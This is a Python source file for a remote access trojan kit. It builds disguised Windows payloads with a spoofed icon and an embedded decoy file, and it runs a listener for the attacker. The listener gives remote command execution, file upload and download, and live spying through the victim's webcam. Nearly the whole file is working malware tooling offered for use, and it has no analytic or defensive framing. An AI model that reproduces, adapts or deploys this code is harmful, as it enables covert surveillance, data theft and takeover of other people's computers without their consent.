import socket
import sys
import cv2
import pickle
import numpy as np
import struct
from threading import Thread
import time
import hashlib 
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import random
import base64
import os
import subprocess
import shutil
import pathlib

srcFolder='src/'
payloadCode='payload'
pyinstaller='pyinstaller'
salt = b'dew4ej2w254erf'
g=9
p=9999



def diffie_hellman(s):
	global g
	global p
	global salt
	x=random.randint(1000, 9999)
	X = str((g**x) % p)
	s.sendall(X.encode())
	y = int(s.recv(1024).decode())
	password_provided = str((y**x) % p)
	password = password_provided.encode()
	kdf = PBKDF2HMAC(
		algorithm=hashes.SHA256(),
		length=32,
		salt=salt,
		iterations=100000,
		backend=default_backend()
	)
	key = base64.urlsafe_b64encode(kdf.derive(password))
	return key




class camHackReciever(Thread):

    def __init__(self, host):
        Thread.__init__(self)
        self.host=host
        self.port=8485
        self.stop=False
        self.key=None



    def startDaemon(self):
        #self.setDaemon(True)
        self.start()



    def encrypt(self, m):
    	f=Fernet(self.key)
    	enc=f.encrypt(m)
    	return enc



    def decrypt(self, m):
    	f=Fernet(self.key)
    	dec=f.decrypt(m)
    	return dec



    def run(self):
        self.stop=False
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.bind((self.host,self.port))
        s.listen(1)
        conn,addr=s.accept()
        self.key=diffie_hellman(conn)
        data = b""
        aux=b""
        payload_size = struct.calcsize(">L")
        cv2.namedWindow("victim")
        while not self.stop:
            data=b""
            aux=b""
            while len(data) < payload_size and not self.stop:
            	#data+=conn.recv(4096)
            	aux+=conn.recv(4096)
            	try:
            		data=self.decrypt(aux)
            	except:
            		continue
            if self.stop:
            	break
            packed_msg_size = data[:payload_size]
            data=data[payload_size:]
            msg_size = struct.unpack(">L", packed_msg_size)[0]
            aux=b""
            while len(data) < msg_size and not self.stop:
            	data+=conn.recv(4096)
            	aux+=conn.recv(4096)
            	try:
            		data+=self.decrypt(aux)
            	except:
            		continue
            conn.sendall(self.encrypt(b'ok'))
            if self.stop:
            	break
            frame_data = data[:msg_size]
            data = data[msg_size:]
            frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
            cv2.imshow('victim',frame)
            cv2.waitKey(1)
        cv2.destroyWindow("victim")
        s.close()



    def kill(self):
        self.stop=True



    def isRunning(self):
        return (not self.stop)



class Controller():
    def __init__(self, port, host, twoSockets=False):
        self.port=port
        self.host=host
        self.victimHost=None
        self.victimPort=None
        self.stop=False
        self.socketS=None
        self.socketR=None
        self.conn=None
        self.camera=None
        self.keyS=None
        self.keyR=None
        self.twoSockets=twoSockets



    def checkConnection(self):
        res=True
        if not self.socketS:
            self.socketS=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                self.socketS.connect((self.victimHost, self.victimPort))
            except:
                self.socketS.close()
                self.socketS=None
                res=False
        return res



    def startWhenHostUp(self, sleep=5):
        while not self.checkConnection():
            time.sleep(sleep)



    def startSender(self):
    	if self.twoSockets:
            self.startWhenHostUp()
            self.keyS=diffie_hellman(self.socketS)
    	else:
        	self.socketS=self.conn
        	self.keyS=self.keyR


    def startReciever(self):
        self.socketR=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.socketR.bind((self.host,self.port))
        self.socketR.listen(1)
        print('Listening on port '+str(self.port))
        conn,addr=self.socketR.accept()
        self.victimHost=addr[0]
        self.conn=conn
        print('Victim: '+self.victimHost)
        self.keyR=diffie_hellman(self.conn)
        if self.twoSockets:
        	self.victimPort=int(self.recv())



    def encrypt(self, m):
    	f=Fernet(self.keyS)
    	enc=f.encrypt(m)
    	return enc



    def decrypt(self, m):
    	f=Fernet(self.keyR)
    	dec=f.decrypt(m)
    	return dec



    def send(self, msg):
    	if not msg:
    		msg='None'
    	if type(msg)!=type(b''):
    		msg=str(msg).encode('ascii')
    	n=str(len(msg)).encode('ascii')
    	self.socketS.sendall(self.encrypt(n))
    	self.conn.recv(4096)
    	self.socketS.sendall(self.encrypt(msg))



    def recv(self):
        res=self.conn.recv(4096)
        res=self.decrypt(res)
        res=res.decode('ascii')
        n=int(res)
        self.socketS.sendall(b'ok')
        res=b''
        aux=b''
        while len(res.decode('ascii')) < n:
        	aux+=self.conn.recv(4096)
        	try:
        		res=self.decrypt(aux)
        	except:
        		continue
        res=res.decode('ascii')
        if res=='None':
        	res=''
        return res



    def recvFile(self):
        res=self.conn.recv(4096)
        res=self.decrypt(res)
        res=res.decode('ascii')
        n=int(res)
        self.socketS.sendall(b'ok')
        res=b''
        aux=b''
        while len(res) < n:
            aux+=self.conn.recv(64000000)
            try:
                res=self.decrypt(aux)
            except:
                continue
        return res



    def close(self):
        self.socketS.close()
        self.socketR.close()



    def run(self):
        self.startReciever()
        self.startSender()
        msg=''
        while msg!='exit' and msg!='kill':
            msg=getInput('> ')
            if msg=='start cam':
                if not self.camera or not self.camera.isRunning():
                    self.camera=camHackReciever(self.host)
                    self.camera.startDaemon()
            elif msg=='stop cam':
                if self.camera and self.camera.isRunning():
                    self.camera.kill()
            elif msg=='upload file':
                self.uploadFile()
                continue
            elif msg=='download file':
                self.downloadFile()
                continue
            elif msg=='clear' or msg=='cls':
                clear()
                continue
            self.send(msg)
            print(self.recv())
        self.close()
        if self.camera and self.camera.isRunning():
            self.camera.kill()



    def uploadFile(self):
    	inputFile=getInput('Input File: ')
    	outputFile=getInput('Output File: ')
    	res='[-] File not found'
    	if os.path.exists(inputFile):
    		self.send('upload file')
    		self.recv()
    		self.send(outputFile)
    		self.recv()
    		content=open(inputFile, 'rb')
    		self.send(content.read())
    		content.close()
    		res=self.recv()
    	print(res)



    def downloadFile(self):
        inputFile=getInput('Input File: ')
        outputFile=getInput('Output File: ')
        res='[-] No file selected'
        if inputFile:
            res='[-] File not found'
            self.send('download file')
            self.recv()
            self.send(inputFile)
            if self.recv()=='ok':
                self.send('ok')
                content=self.recvFile()
                file=open(outputFile, 'wb')
                file.write(content)
                file.close()
                res='[+] File downloaded successfully'
        print(res)




def getInput(msg='>'):
	res=None
	try:
		res=str(input(msg))
	except:
		res=str(raw_input(msg))
	return res


def startController(params=None):
    if not params:
        clear()
        title='    Strat Listener    '
        print('-'*len(title))
        print(title)
        print('-'*len(title))
        params={}
        params['host']=getInput('Host: ')
        params['port']=int(getInput('Port: '))
        print('Sockets: ')
        print('      <->               -->       ')
        print('                        <--       ')
        print('(-) secure        (+) secure      ')
        print('(+) efficient     (-) efficient   ')
        print('      [1]               [2]       ')
        sockets=getInput('num: ').replace(' ','')
        while sockets!='1' and sockets!='2':
            print(sockets+' is not a valid option')
            sockets=getInput('num: ').replace(' ','')
        params['sockets']=sockets
    clear()
    c=Controller(params['port'], params['host'], (params['sockets']=='2'))
    c.run()



def clear():
	if 'posix' in os.name:
		os.system('clear')
	elif 'nt' in os.name:
		os.system('cls')



def menu():
	clear()
	text=[
				'[1] Create Payload',
				'[2] Start Listener',
				'[3] Exit',
				''
	]
	for line in text:
		print(line)
	return getInput('num: ')



def checkDependecies():
    global srcFolder
    clear()
    res=True
    print('Cecking dependecies...')
    command='python -h'
    p=subprocess.Popen(command.split(), stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    out, err=p.communicate()
    if err:
    	res=False
    	print('[-] Python is not installed!')
    	input()
    	'''
    	user=getInput('Do you want to install it? [Y/n]: ')
    	while user and user.lower()!='n' and user.lower()!='y':
    		print(user+' is not a valid option')
    		user=getInput('Do you want to install it? [Y/n]: ')
    	if user.lower()=='y':
    		os.chdir(srcFolder)
    		command='python-3.8.3.exe /quiet PrependPath=1'
    		os.system(command)
    		command='python -h'
    		p=subprocess.Popen(command.split(), stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    		out, err=p.communicate()
    		while err:
    			time.sleep(10)
    			p=subprocess.Popen(command.split(), stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    			out, err=p.communicate()
    		os.chdir('../')
    	'''
    else:
    	print('[+] Python is installed')
    command='pip -h'
    p=subprocess.Popen(command.split(), stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    out, err=p.communicate()
    if err:
    	res=False
    	print('[-] pip is not installed!')
    	input()
    	'''
    	user=getInput('Do you want to install it? [Y/n]: ')
    	while user and user.lower()!='n' and user.lower()!='y':
    		print(user+' is not a valid option')
    		user=getInput('Do you want to install it? [Y/n]: ')
    	if user.lower()=='y':
    		os.chdir(srcFolder)
    		command='python get-pip.py'
    		os.system(command)
    		command='python -m pip install --upgrade pip'
    		os.system(command)
    		os.chdir('../')
    	'''
    else:
    	print('[+] pip is installed')
    command='pyinstaller -h'
    p=subprocess.Popen(command.split(), stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    out, err=p.communicate()
    if err:
    	res=False
    	print('[-] pyinstaller is not installed')
    	user=getInput('Do you want to install it? [Y/n]: ')
    	while user and user.lower()!='n' and user.lower()!='y':
    		print(user+' is not a valid option')
    		user=getInput('Do you want to install it? [Y/n]: ')
    	if user.lower()=='y':
    		command='python -m pip install --upgrade pip'
    		os.system(command)
    		command='pip install pyinstaller'
    		os.system(command)
    else:
    	print('[+] pyinstaller is installed')
    return res



def fileToBase64(filename):
    file=open(filename, 'rb')
    content=file.read()
    file.close()
    base64EncodedStr = base64.b64encode(content)
    return base64EncodedStr



def startPayload():
    global srcFolder
    global payloadCode
    global pyinstaller
    res=None
    if checkDependecies():
        clear()
        title='    Create Payload    '
        print('-'*len(title))
        print(title)
        print('-'*len(title))
        host=getInput('Attacker Host: ')
        port=int(getInput('Attacker Port: '))
        print('Sockets: ')
        print('      <->               -->       ')
        print('                        <--       ')
        print('(-) secure        (+) secure      ')
        print('(+) efficient     (-) efficient   ')
        print('      [1]               [2]       ')
        sockets=getInput('num: ').replace(' ','')
        while sockets!='1' and sockets!='2':
            print(sockets+' is not a valid option')
            sockets=getInput('num: ').replace(' ','')
        name=getInput('Payload Name: ').split('.')[0]+'.py'
        icon=getInput('Icon (entire route): ')
        while icon and not os.path.isfile(icon):
            print('Invalid File')
            icon=getInput('Icon (entire route): ')
        spoofFileName=getInput('File to Spoof: ')
        while spoofFileName and not os.path.isfile(spoofFileName):
            print('Invalid File')
            spoofFileName=getInput('File to Spoof: ')
        if spoofFileName:
        	print('Reading File...')
        	spoofFile=fileToBase64(spoofFileName)
        if icon:
            icon='-i "'+icon+'"'
        print('Generating Payload...')
        os.chdir(srcFolder)
        try:
        	os.remove('dist/'+name.split('.')[0]+'.exe')
        except:
        	pass
        file=open(payloadCode, 'r')
        code=''.join(file.readlines())
        file.close()
        code=code.replace('<HOST>', host)
        code=code.replace('<PORT>', str(port))
        code=code.replace('<SOCKETS>', sockets)
        if spoofFileName:
       		code=code.replace('<NAME>', spoofFileName.split('/')[-1].split(base64.b64decode(b'XA==').decode('ascii'))[-1])
       		code=code.replace('<CONTENT>', str(spoofFile))
       	else:
        	code=code.replace('<NAME>', '')
        	code=code.replace('<CONTENT>', '""')
        file=open(name, 'w')
        file.write(code)
        file.close()
        command='<pyinstaller> -y -F -w  <icon> "<name>"' 
        command=command.replace('<pyinstaller>', pyinstaller).replace('<icon>', icon).replace('<name>', name)
        #exit()
        os.system(command)
        try:
        	os.remove(name)
        	os.remove(name.split('.')[0]+'.spec')
        except:
        	pass
        shutil.rmtree('build')
        shutil.rmtree('__pycache__')
        os.chdir('dist')
        user='n'
        if os.path.isfile(name.split('.')[0]+'.exe'):	
	        path=pathlib.Path().absolute()
	        os.startfile(path)
        	user=getInput('Do you want to start the listener? [Y/n]: ')
        else:
        	print('[!] Error generating payload')
        	getInput('Press any key to continue...')
        os.chdir('../../')
        while user and user.lower()!='n' and user.lower()!='y':
            print(user+' is not a valid option')
            user=getInput('Do you want to start the listener? [Y/n]: ')
        if not user or user.lower()=='y':
            res={
                'host': host, 
                'port': port,
                'sockets': sockets
            }
    return res




def main():
    user=''
    while user!='3':
        user=menu()
        if user=='1':
            res=None
            try:
                res=startPayload()
            except:
                pass
            if res:
                startController(res)
        elif user=='2':
            startController()
    clear()



main()